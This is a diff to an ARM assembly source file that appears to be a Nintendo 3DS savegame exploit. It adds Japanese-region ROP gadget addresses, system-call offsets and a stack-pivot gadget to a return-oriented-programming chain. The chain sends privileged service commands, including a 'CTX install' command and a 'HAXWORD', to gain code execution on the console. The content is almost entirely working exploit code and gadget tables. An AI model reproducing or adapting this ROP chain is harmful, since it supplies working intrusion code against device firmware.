@@ -2,21 +2,41 @@
 .section .init
 .global _start
 
+#if REGION!=0//Non-JPN
 #define svcControlMemory 0x301a0c
 #define svcConnectToPort 0x2fa7b8
 #define svcGetProcessId 0x30794c
+#else//JPN
+#define svcControlMemory 0x301524
+#define svcConnectToPort 0x2fa2d0
+#define svcGetProcessId 0x307464
+#endif
 
+#if REGION!=0//Non-JPN
 #define srvinit_RegisterClient 0x30df98 //Calls srv_RegisterClient(), increments *r6, L_30aedc(sp+0), then executes "pop {r3, r4, r5, r6, r7, pc}". L_30aedc decreases *(inr0+8) by 1, and returns if that's >0 after decreasing it.
 #define srv_GetServiceHandle 0x30dde8
+#else//JPN
+#define srvinit_RegisterClient 0x30dab0
+#define srv_GetServiceHandle 0x30d900
+#endif
 
 #define GETPROCID 0x409bec //Calls svcGetProcessId, "mov r0, r4", then pop {r3, r4, r5, pc}
 #define CLOSEHANDLE 0x400ae4+4 //mov r4, r0. ptr = inr0, if(*ptr)svcCloseHandle(*ptr). *ptr = 0, r0 = ptr, "pop {r4, pc}".
-#define THROWFATALERR 0x3351b4
 #define COND_THROWFATALERR 0x2135ec //This calls THROWFATALERR if r0 bit31 is set, then executes: pop {r3, r4, r5, r6, r7, r8, r9, pc}
+
+#if REGION!=0//Non-JPN
+#define THROWFATALERR 0x3351b4
 #define GETTHREADSTORAGE 0x2db5ac //Stores r0 from "mrc 15, 0, r0, cr13, cr0, {3}" to r3+4, increments the word @ r3+8, r0=1 then pop {r4} bx	lr
 #define LDRR0 0x2d1230 //ldr r0, [r0] then bx lr
 #define ADDSHIFTVAL_BLXR3 0x3201dc //r4 = r0 + r1<<2. classptr = *(r5+0x38). Calls vtable funcptr +16 with r3 for the funcptr, r2=*r4, r1=<ptr loaded from pool>
 #define SLEEP_THREAD 0x30e604
+#else//JPN
+#define THROWFATALERR 0x334ccc
+#define GETTHREADSTORAGE 0x2db0c4
+#define LDRR0 0x2d0d48
+#define ADDSHIFTVAL_BLXR3 0x31fcf4
+#define SLEEP_THREAD 0x30e11c
+#endif
 
 #define GSPGPU_HANDLEADR 0x00558aac
 
@@ -35,6 +55,7 @@
 #define GSP_CMD8 0x453f44 //inr0 = addr, inr1 = size
 #define THREADINIT_LOCALSTORAGE 0x435f68 //This is the initialization func called by the thread entrypoint code, prior to calling the actual thread entrypoint funcptr.
 #define svcCreateThread 0x422180
+#define ROP_POPR3_ADDSPR3_POPPC 0x4a5ac4 // "pop	{r3}" "add sp, sp, r3" "pop {pc}"
 #elif REGION==2 //EUR
 #define SENDCMDADR 0x4360c4
 #define GXLOWCMD_0 0x4939ac
@@ -42,26 +63,47 @@
 #define GSP_CMD8 0x453f64
 #define THREADINIT_LOCALSTORAGE 0x435f8c
 #define svcCreateThread 0x4221a4
+#define ROP_POPR3_ADDSPR3_POPPC 0x4a5ae4
+#elif REGION==0 //JPN
+#define SENDCMDADR 0x436078
+#define GXLOWCMD_0 0x493964
+#define GXLOWCMD_4 0x493b6c
+#define GSP_CMD8 0x453f1c
+#define THREADINIT_LOCALSTORAGE 0x435f40
+#define svcCreateThread 0x422158
+#define ROP_POPR3_ADDSPR3_POPPC 0x4a5a9c
 #else
 #error Invalid region.
 #endif
 
+#if REGION!=0//Non-JPN
 #define RDSAVEBEGINADR 0x324eac+4
 #define WRSAVEBEGINADR 0x2e613c+4
 #define SAVECTXDESTORYADR 0x31b99c+0xc
 #define FSMNTSAVEADR 0x2fc0c8+4 //This is after this instruction: "push {r3, r4, r5, lr}"
 #define FSUMNTADR 0x2fbfa8+4
 
+#define BLXR6 0x2c45e0 //Executes "blx r6", increments r4, then if r4>=16 executes vpop {d8}, pop {r4, r5, r6, r7, r8, r9, sl, pc}
+#define MEMCPY 0x34338c
+#define MEMSET 0x32b184 //r0=adr, r1=size. The first instruction here is "r2=0", therefore jumping to +4 allows controlling the value which is written to the buffer.
+#else//JPN
+#define RDSAVEBEGINADR 0x3249c4+4
+#define WRSAVEBEGINADR 0x2e5c54+4
+#define SAVECTXDESTORYADR 0x31b4b4+0xc
+#define FSMNTSAVEADR 0x2fbbe0+4
+#define FSUMNTADR 0x2fbac0
+
+#define BLXR6 0x2c40f8
+#define MEMCPY 0x342ea4
+#define MEMSET 0x32ac9c
+#endif
+
 #define REGPOPADR 0x4a5c80 //Addr of this instruction: "pop {r0, r1, r2, r3, r4, r5, r6, fp, ip, pc}"
 #define REGPOP24ADR 0x1aca7c //Addr of this instruction: "pop {r4, r5, r6, r7, r8, r9, sl, fp, pc}"
 #define REGPOPR0R3SL 0x4a8964 //Addr of this instruction: "pop {r0, r1, r2, r3, sl, ip, pc}"
 #define REGPOPR5R6 0x4b7cb0 //Addr of this instruction: "pop {r5, r6, pc}"
 #define POPPC 0x1048a4 //Addr of this instruction: "pop {pc}"
-#define INFINLPADR 0x139501
-#define BLXR6 0x2c45e0 //Executes "blx r6", increments r4, then if r4>=16 executes vpop {d8}, pop {r4, r5, r6, r7, r8, r9, sl, pc}
 #define STACKMEMCPYADR 0x1aa988
-#define MEMCPY 0x34338c
-#define MEMSET 0x32b184 //r0=adr, r1=size. The first instruction here is "r2=0", therefore jumping to +4 allows controlling the value which is written to the buffer.
 
 #define RSAINFO_OFF 0x880+0x40
 
@@ -414,7 +456,6 @@ SENDCMD 0x00558ad4, 0x04030082, SAVEADR+0x1080 @ Register this process with srv:
 SENDCMD SAVEADR+0x1040, 0x00020244, SAVEADR+0x1100
 
 .word THROWFATALERR
-@.word INFINLPADR
 
 #endif
 
@@ -551,8 +592,6 @@ SENDCMD SAVEADR+0x1040, 0x00020244, SAVEADR+0x1100
 SENDCMD SAVEADR+0x1040, 0x08190108, SAVEADR+0x1180 @ CTX install cmd
 SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 
-//.word THROWFATALERR
-//.word INFINLPADR
 .word HAXWORD
 #endif
 
@@ -644,7 +683,6 @@ SENDCMD SAVEADR+0x1040, 0x04020040, SAVEADR+0x1180 @ Unregister this process fro
 SENDCMD SAVEADR+0x1040, 0x040103C0, SAVEADR+0x1180 @ Register this process with fs:REG.
 
 .word THROWFATALERR
-//.word INFINLPADR
 #endif
 
 .word REGPOPADR
@@ -736,7 +774,6 @@ SENDCMD SAVEADR+0x1040, 0x040103C0, SAVEADR+0x1180 @ Register this process with 
 .word 0
 .word 0, 0, 0, 0, 0, 0
 .word 0x00100000
-//.word INFINLPADR
 #endif
 
 /*.word REGPOPADR
@@ -1633,7 +1670,9 @@ arm11code_payloadpath_end:
 .word 0 @ r9
 .word 0 @ sl
 
-.word INFINLPADR
+.word ROP_POPR3_ADDSPR3_POPPC
+
+.word 0xfffffff8 @ Lame infinite-loop, since JPN-region game doesn't have any ARM/thumb branch instructions for infinite loop.
 #endif
 
 .space (_start + 0x14dc) - .
